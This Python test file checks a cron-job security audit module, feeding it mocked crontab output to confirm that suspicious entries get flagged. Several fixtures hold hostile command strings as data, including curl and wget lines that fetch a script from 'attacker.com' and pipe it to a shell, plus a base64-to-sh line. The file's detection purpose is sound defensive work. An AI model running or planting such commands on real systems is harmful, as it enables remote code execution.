import sys
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile():
    return SystemProfile(
        platform=Platform.DARWIN,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "cron_jobs_audit")


def _make_subprocess_result(stdout="", stderr="", returncode=0):
    result = MagicMock()
    result.stdout = stdout
    result.stderr = stderr
    result.returncode = returncode
    return result


def _fake_run_no_crons():
    """No cron jobs at all"""
    def fake_run(cmd, **kwargs):
        # crontab -l fails, ls/cat commands return empty
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(returncode=1, stderr="no crontab for user")
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_normal_crons():
    """Normal, legitimate cron jobs"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(
                stdout="0 2 * * * /usr/local/bin/backup.sh\n"
                       "30 * * * * /usr/bin/cleanup.sh\n"
            )
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_rce_cron():
    """User crontab with RCE pattern"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(
                stdout="0 2 * * * /usr/local/bin/backup.sh\n"
                       "* * * * * curl http://attacker.com/script.sh | bash\n"
            )
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_suspicious_path():
    """User crontab with command in /tmp"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(
                stdout="0 2 * * * /usr/local/bin/backup.sh\n"
                       "*/5 * * * * /tmp/malware.sh\n"
            )
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_every_minute():
    """User crontab with every-minute job"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(
                stdout="0 2 * * * /usr/local/bin/backup.sh\n"
                       "* * * * * /usr/local/bin/beacon.sh\n"
            )
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_base64_obfuscation():
    """User crontab with base64 encoded command"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(
                stdout="0 2 * * * /usr/local/bin/backup.sh\n"
                       "0 3 * * * echo 'SGVsbG8gV29ybGQ=' | base64 -d | sh\n"
            )
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_system_crontab():
    """System crontab entries from /etc/crontab"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            # User crontab fails
            return _make_subprocess_result(returncode=1, stderr="no crontab for user")
        elif isinstance(cmd, list) and cmd[0] == "cat" and "/etc/crontab" in cmd:
            return _make_subprocess_result(
                stdout="0 2 * * * root /usr/local/bin/backup.sh\n"
                       "30 * * * * root /usr/bin/cleanup.sh\n"
            )
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_periodic_scripts():
    """Periodic scripts from /etc/periodic/"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(returncode=1, stderr="no crontab for user")
        elif isinstance(cmd, list) and cmd[0] == "ls" and "/etc/periodic/daily/" in cmd:
            return _make_subprocess_result(stdout="100.daily-script\n200.maintenance\n")
        elif isinstance(cmd, list) and cmd[0] == "ls" and "/etc/periodic/weekly/" in cmd:
            return _make_subprocess_result(stdout="100.weekly-script\n")
        elif isinstance(cmd, list) and cmd[0] == "ls" and "/etc/periodic/monthly/" in cmd:
            return _make_subprocess_result(stdout="")
        return _make_subprocess_result(stdout="")
    return fake_run


def _fake_run_with_at_jobs():
    """At jobs from atq"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list) and "crontab" in cmd:
            return _make_subprocess_result(returncode=1, stderr="no crontab for user")
        elif isinstance(cmd, list) and cmd[0] == "atq":
            return _make_subprocess_result(
                stdout="1\tWed Jul  8 10:30:00 2026 a user\n"
                       "2\tThu Jul  9 15:45:00 2026 a user\n"
            )
        return _make_subprocess_result(stdout="")
    return fake_run


def test_cron_jobs_audit_discovered():
    mod = _get_module()
    assert mod.name == "cron_jobs_audit"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.SAFE
    assert Platform.DARWIN in mod.platforms


def test_cron_jobs_audit_no_crons():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_no_crons()):
        result = mod.check(_make_profile())
    assert not result.has_issues


def test_cron_jobs_audit_normal_crons():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_normal_crons()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should have INFO finding for cron entries found
    assert any(f.data.get("check") == "cron_entries_found" for f in result.findings)
    assert result.findings[0].severity == Severity.INFO


def test_cron_jobs_audit_rce_pattern():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_rce_cron()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should have CRITICAL finding for RCE
    rce_findings = [f for f in result.findings if f.data.get("check") == "rce_in_cron"]
    assert len(rce_findings) == 1
    assert rce_findings[0].severity == Severity.CRITICAL


def test_cron_jobs_audit_suspicious_path():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_suspicious_path()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should have CRITICAL finding for suspicious path
    path_findings = [f for f in result.findings if f.data.get("check") == "suspicious_path"]
    assert len(path_findings) == 1
    assert path_findings[0].severity == Severity.CRITICAL


def test_cron_jobs_audit_every_minute():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_every_minute()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should have WARNING finding for every-minute cron
    minute_findings = [f for f in result.findings if f.data.get("check") == "every_minute"]
    assert len(minute_findings) == 1
    assert minute_findings[0].severity == Severity.WARNING


def test_cron_jobs_audit_base64_obfuscation():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_base64_obfuscation()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should have WARNING finding for obfuscation
    obfuscation_findings = [f for f in result.findings if f.data.get("check") == "obfuscated_command"]
    assert len(obfuscation_findings) == 1
    assert obfuscation_findings[0].severity == Severity.WARNING


def test_cron_jobs_audit_system_crontab():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_system_crontab()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should find system crontab entries
    cron_found_findings = [f for f in result.findings if f.data.get("check") == "cron_entries_found"]
    assert len(cron_found_findings) == 1


def test_cron_jobs_audit_periodic_scripts():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_periodic_scripts()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should find periodic scripts
    cron_found_findings = [f for f in result.findings if f.data.get("check") == "cron_entries_found"]
    assert len(cron_found_findings) == 1


def test_cron_jobs_audit_at_jobs():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_at_jobs()):
        result = mod.check(_make_profile())
    assert result.has_issues
    # Should find at jobs
    cron_found_findings = [f for f in result.findings if f.data.get("check") == "cron_entries_found"]
    assert len(cron_found_findings) == 1


def test_cron_jobs_audit_fix_is_informational():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_normal_crons()):
        check = mod.check(_make_profile())
        fix = mod.fix(check, Mode.MANUAL)
    # fix() should always succeed with informational messages
    assert fix.all_succeeded
    # Should have at least one action
    assert len(fix.actions) > 0
    # All actions should be SAFE risk level
    assert all(a.risk_level == RiskLevel.SAFE for a in fix.actions)


def test_cron_jobs_audit_fix_for_rce():
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_run_with_rce_cron()):
        check = mod.check(_make_profile())
        fix = mod.fix(check, Mode.MANUAL)
    # Should have RCE action
    rce_actions = [a for a in fix.actions if "remote code execution" in a.description.lower()]
    assert len(rce_actions) >= 1


def test_cron_jobs_audit_rce_with_wget():
    """Test RCE pattern detection with wget instead of curl"""
    def fake_run_wget():
        def fake_run(cmd, **kwargs):
            if isinstance(cmd, list) and "crontab" in cmd:
                return _make_subprocess_result(
                    stdout="0 2 * * * /usr/local/bin/backup.sh\n"
                           "* * * * * wget -O - http://attacker.com/script.sh | sh\n"
                )
            return _make_subprocess_result(stdout="")
        return fake_run

    mod = _get_module()
    with patch("subprocess.run", side_effect=fake_run_wget()):
        result = mod.check(_make_profile())
    assert result.has_issues
    rce_findings = [f for f in result.findings if f.data.get("check") == "rce_in_cron"]
    assert len(rce_findings) == 1


def test_cron_jobs_audit_eval_obfuscation():
    """Test eval obfuscation detection"""
    def fake_run_eval():
        def fake_run(cmd, **kwargs):
            if isinstance(cmd, list) and "crontab" in cmd:
                return _make_subprocess_result(
                    stdout="0 2 * * * /usr/local/bin/backup.sh\n"
                           "0 3 * * * python -c eval('code here')\n"
                )
            return _make_subprocess_result(stdout="")
        return fake_run

    mod = _get_module()
    with patch("subprocess.run", side_effect=fake_run_eval()):
        result = mod.check(_make_profile())
    assert result.has_issues
    obfuscation_findings = [f for f in result.findings if f.data.get("check") == "obfuscated_command"]
    assert len(obfuscation_findings) == 1
